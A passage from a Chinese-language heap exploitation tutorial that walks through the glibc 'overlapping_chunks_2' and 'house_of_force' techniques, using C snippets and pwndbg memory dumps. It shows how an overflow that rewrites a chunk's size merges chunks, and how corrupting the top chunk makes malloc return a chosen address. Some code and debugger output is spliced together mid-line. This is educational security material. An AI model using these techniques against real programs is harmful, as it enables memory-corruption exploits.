       73   fprintf(stderr, "p4 = %s\n", (char *)p4);
       74   fprintf(stderr, "p3 = %s\n", (char *)p3);
### 0x10 overlapping_chunks_2
同样是堆重叠问题，这里是在 free 之前修改 size 值，使 free 错误地修改了下一个 chunk 的 prev_size 值，导致中间的
chunk 强行合并。
我们这里 malloc 五块chunk，第五块的作用是防止 chunk 4 被free 后被放入 top chunk。然后这里的覆盖目标是 chunk2
到chunk4。
首先 free 掉 chunk 4
    free(p4);
由于 chunk 4现在是 free 状态，这个时候 chunk 5 的presize 如下：
    PwnLife> p p5
    $3 = (intptr_t *) 0x603fd0
    PwnLife> x/20gx p5-4
    0x603fb0:   0x4444444444444444  0x4444444444444444                  
紧接着，我们假设 chunk 1 有堆溢出，我们可以通过堆溢出修改 chunk 2的size
    *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; // p p2
    $4 = (intptr_t *) 0x603400
    PwnLife> x/20gx p2-2
    0x6033f0:   0x4141414141414141  0x00000000000007e1      
chunk 2 的 size 值修改为 chunk 2 和 chunk 3 的大小之和，最后的 1 是标志位。这样当我们释放 chunk 2
的时候，malloc 根据这个被修改的 size 值，会以为 chunk 2 加上 chunk 3 的区域都是要释放的，然后就错误地修改了 chunk 5
的 prev_size。
    59   fprintf(stderr, "\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n");
       60   fprintf(stderr, "\nThis operation will basically create a big free chunk that wrongly includes p3\n");
       61   free(p2);
    PwnLife> p p5
    $5 = (intptr_t *) 0x603fd0
    PwnLife> x/20gx p5-2
    0x603fc0:   0x0000000000000bd0  0x00000000000003f0   
我们会发现，当free 掉 chunk 2 后， chunk 2 ，chunk 3 一起被释放，接着，它发现紧邻的一块 chunk 4 也是 free
状态，就把它俩合并在了一起，组成一个大 free chunk，放进 unsorted bin 中。 chunk 5 的 prev size 也发生了变化。
然后当我们申请一块新chunk的时候，会从 unsorted bin中取出一部分，比如这里我们申请一块 p6
    p6 = malloc(2000);
即将 chunk 2 chunk 3 的部分拿出来。
    PwnLife> p p6
    $6 = (intptr_t *) 0x603400
    PwnLife> x/20gx p6-2
    0x6033f0:   0x4141414141414141  0x00000000000007e1
    0x603400:   0x00007ffff7dd2138  0x00007ffff7dd2138
    0x603410:   0x00000000006033f0  0x00000000006033f0
    0x603420:   0x4242424242424242  0x4242424242424242
    0x603430:   0x4242424242424242  0x4242424242424242
    0x603440:   0x4242424242424242  0x4242424242424242
    0x603450:   0x4242424242424242  0x4242424242424242
    0x603460:   0x4242424242424242  0x4242424242424242
    0x603470:   0x4242424242424242  0x4242424242424242
    0x603480:   0x4242424242424242  0x4242424242424242
然后 unsorted bin中剩下的部分就是 chunk4
    PwnLife> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x603bd0 ◂— 0x7ffff7dd1b58
    smallbins
    empty
    largebins
    empty
    PwnLife> x/20gx 0x603bd0
    0x603bd0:   0x4343434343434343  0x00000000000003f1
    0x603be0:   0x00007ffff7dd1b58  0x00007ffff7dd1b58
    0x603bf0:   0x4444444444444444  0x4444444444444444
    0x603c00:   0x4444444444444444  0x4444444444444444
    0x603c10:   0x4444444444444444  0x4444444444444444
    0x603c20:   0x4444444444444444  0x4444444444444444
    0x603c30:   0x4444444444444444  0x4444444444444444
    0x603c40:   0x4444444444444444  0x4444444444444444
    0x603c50:   0x4444444444444444  0x4444444444444444
    0x603c60:   0x4444444444444444  0x4444444444444444
    PwnLife>
这个时候，chunk 6 和chunk 3就已经是同一块 chunk了。
### 0x11 house_of_force
Exploiting the Top Chunk (Wilderness) header in order to get malloc to return
a nearly-arbitrary pointer
house_of_force 是一种通过改写 top chunk 的 size 字段来欺骗 malloc
返回任意地址的技术。我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins
都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。所以 top chunk 的大小会随着分配和回收不停地变化。
首先随便 malloc 一个 chunk
    PwnLife> x/20gx 0x603000
    0x603000:   0x0000000000000000  0x0000000000000111
    0x603010:   0x0000000000000000  0x0000000000000000
    0x603020:   0x0000000000000000  0x0000000000000000
    0x603030:   0x0000000000000000  0x0000000000000000
    0x603040:   0x0000000000000000  0x0000000000000000
    0x603050:   0x0000000000000000  0x0000000000000000
    0x603060:   0x0000000000000000  0x0000000000000000
    0x603070:   0x0000000000000000  0x0000000000000000
    0x603080:   0x0000000000000000  0x0000000000000000
    0x603090:   0x0000000000000000  0x0000000000000000
    PwnLife>
    0x6030a0:   0x0000000000000000  0x0000000000000000
    0x6030b0:   0x0000000000000000  0x0000000000000000
    0x6030c0:   0x0000000000000000  0x0000000000000000
    0x6030d0:   0x0000000000000000  0x0000000000000000
    0x6030e0:   0x0000000000000000  0x0000000000000000
    0x6030f0:   0x0000000000000000  0x0000000000000000
    0x603100:   0x0000000000000000  0x0000000000000000
    0x603110:   0x0000000000000000  0x0000000000020ef1              x/20gx 0x603100
    0x603100:   0x0000000000000000  0x0000000000000000
    0x603110:   0x0000000000000000  0xffffffffffffffff          x/20s 0x602050
    0x602050:   ""
    0x602051:   ""
    0x602052:   ""
    0x602053:   ""
    0x602054:   ""
    0x602055:   ""
    0x602056:   ""
    0x602057:   ""
    0x602058:   "\271\020"
    0x60205b:   ""
    0x60205c:   ""
    0x60205d:   ""
    0x60205e:   ""
    0x60205f:   ""
    0x602060 : "This is a strin"...
    0x60206f :  "g that we want "...
    0x60207e :  "to overwrite."
    0x60208c:   ""
    0x60208d:   ""
    0x60208e:   ""
    PwnLife>
该技术的缺点是会受到 ASLR 的影响，因为如果攻击者需要修改指定位置的内存，他首先需要知道当前 top chunk 的位置以构造合适的 malloc
大小来转移 top chunk。而 ASLR 将使堆内存地址随机，所以该技术还需同时配合使用信息泄漏以达成攻击。